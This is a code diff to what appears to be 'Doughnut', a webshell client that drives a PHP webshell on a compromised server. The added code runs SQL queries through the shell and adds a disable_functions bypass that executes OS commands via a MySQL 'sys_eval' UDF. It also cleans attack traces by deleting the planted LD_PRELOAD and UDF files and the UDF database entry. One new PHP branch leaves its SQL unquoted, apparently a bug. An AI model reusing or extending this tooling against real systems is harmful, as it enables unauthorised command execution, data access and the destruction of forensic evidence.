@@ -10,10 +10,12 @@ from uuid import uuid4
 from locale import getpreferredencoding
 
 import requests
+from prettytable import PrettyTable
 from requests.models import complexjson
 from requests.utils import guess_json_utf
 from urllib3 import disable_warnings
 
+from encode.hex import run as hex_encode
 from libs.config import color, gget, gset
 from libs.debug import DEBUG
 
@@ -71,7 +73,7 @@ def banner():
 
 """
         )
-    print(color.green("Doughnut Version: 3.6\n"))
+    print(color.green("Doughnut Version: 3.8\n"))
 
 
 def base64_encode(data: str, encoding="utf-8"):
@@ -83,7 +85,7 @@ def base64_decode(data: str, encoding="utf-8"):
 
 
 def clean_trace():
-    def get_clean_ld_preload_php(filename: str):
+    def get_clean_php(filename: str):
         system_clean_command = f"rm -f {filename} && echo success"
         return """$f=base64_decode("%s");
     if (!unlink($f)){
@@ -91,17 +93,24 @@ def clean_trace():
     }else{echo "success";}
     """ % (base64_encode(filename), get_system_code(system_clean_command))
     ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
-    if (ld_preload_filename):
-        print(color.yellow("\nClean LD_PRELOAD traces...\n"))
-        res = send(get_clean_ld_preload_php(ld_preload_filename))
-        if (res):
-            text = res.r_text.strip()
-            if ("success" in text):
-                print(color.green("Clean success\n"))
-            else:
-                print(color.red("Clean failed\n"))
+    udf_filename = gget("webshell.udf_path", "webshell", None)
+    clean_files = (ld_preload_filename, udf_filename)
+    for each in clean_files:
+        if (each):
+            print(color.yellow("\nClean %s ...\n" % each))
+            res = send(get_clean_php(each))
+            if (res):
+                text = res.r_text.strip()
+                if ("success" in text):
+                    print(color.green("Clean success\n"))
+                else:
+                    print(color.red("Clean failed\n"))
+    if (udf_filename):
+        print(color.yellow("\nClean udf ...\n"))
+        execute_sql_command("delete from mysql.func where name='sys_eval';")
     gset("webshell.ld_preload_path", None, True, "webshell")
     gset("webshell.ld_preload_func", None, True, "webshell")
+    gset("webshell.udf_path", None, True, "webshell")
 
 
 def r_json(self, **kwargs):
@@ -149,6 +158,76 @@ def fake_referer():
         return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
     elif (i == 6):
         return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
+
+
+def get_db_connect_code(host="", username="", password="", dbname="", port=""):
+    host = host if host else gget("db_host", "webshell", "")
+    username = username if username else gget("db_username", "webshell", "")
+    password = password if password else gget("db_password", "webshell", "")
+    dbname = dbname if dbname else gget("db_dbname", "webshell", "")
+    port = port if port else gget("db_port", "webshell", "")
+    connect_type = gget("db_connect_type", "webshell")
+    dbms = gget("db_ext", "webshell")
+    if (connect_type == "pdo"):
+        extra_port = f"port={port};" if port else ""
+        extra_dbname = f"dbname={dbname};" if dbname else ""
+        return f'$dsn="{dbms}:host={host};{extra_port}{extra_dbname}";$con= new PDO($dsn,"{username}","{password}");'
+    elif (connect_type == "mysqli"):
+        connect_code = '$con=mysqli_connect(%s);'
+        temp_code = ",".join([f'"{y}"' for y in filter(
+            lambda x: x, (host, username, password, dbname, port))])
+        return connect_code % temp_code
+    return ""
+
+
+def get_sql_command_php(command, database, ruid, luid):
+    connect_type = gget("db_connect_type", "webshell")
+    connect_code = get_db_connect_code(dbname=database)
+    command = base64_encode(command)
+    if (connect_type == "pdo"):
+        return """try{%s
+$r=$con->query(base64_decode('%s'));
+$rows=$r->fetchAll(PDO::FETCH_ASSOC);
+foreach($rows[0] as $k=>$v){
+    echo "$k"."%s";
+}
+echo "%s";
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v"."%s";};echo "%s";}
+} catch (PDOException $e){
+die("Connect error: ". $e->getMessage());
+}""" % (connect_code, command, luid, ruid, luid, ruid)
+    elif (connect_type == "mysqli"):
+        return """%s
+$r=$con->query(base64_decode('%s'));
+$rows=$r->fetch_all(MYSQLI_ASSOC);
+foreach($rows[0] as $k=>$v){
+    echo "$k"."%s";
+}
+echo "%s";
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v"."%s";};echo "%s";}""" % (connect_code, command, luid, ruid, luid, ruid)
+    else:
+        return ""
+
+
+def execute_sql_command(command, database: str = "", raw: bool = False):
+    database = database if (database) else gget("db_dbname", "webshell")
+    ruid = str(uuid4())
+    luid = str(uuid4())
+    res = send(get_sql_command_php(command, database, ruid, luid))
+    if (not res):
+        return ''
+    rows = res.r_text.strip().split(ruid)
+    if (raw):
+        return [row.split(luid)[:-1] for row in rows[:-1]]
+    elif (len(rows) > 1):
+        info = rows[0].split(luid)[:-1]
+        form = PrettyTable(info)
+        for row in rows[1:-1]:
+            row_data = row.split(luid)[:-1]
+            if (row_data):
+                form.add_row(row_data)
+        return form
+    return ''
 
 
 def send(data: str, raw: bool = False, **extra_params):
@@ -1010,6 +1089,29 @@ sleep(1);
 $o=file_get_contents("/tmp/%s");
 %s
 unlink("/tmp/%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
+    elif (bypass_df == 8):
+        connect_type = gget("db_connect_type", "webshell")
+        if (connect_type == "pdo"):
+            return """try{%s
+$r=$con->query("select sys_eval(unhex('%s'))");
+$rr=$r->fetch();
+$o=$rr[0];
+$GLOBAL['o']=$o;
+%s
+} catch (PDOException $e){
+}""" % (get_db_connect_code(), hex_encode(command), print_command)
+        elif (connect_type == "mysql"):
+            return """%s
+if ($con)
+{
+$r=$con->query(select sys_eval(unhex('%s')));
+$rr=$r->fetch_all(MYSQLI_NUM);
+$o=$rr[0];
+$GLOBAL['o']=$o;
+%s
+$r->close();
+$con->close();
+}""" % (get_db_connect_code(), hex_encode(command), print_command)
     elif (gget("webshell.exec_func", "webshell")):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
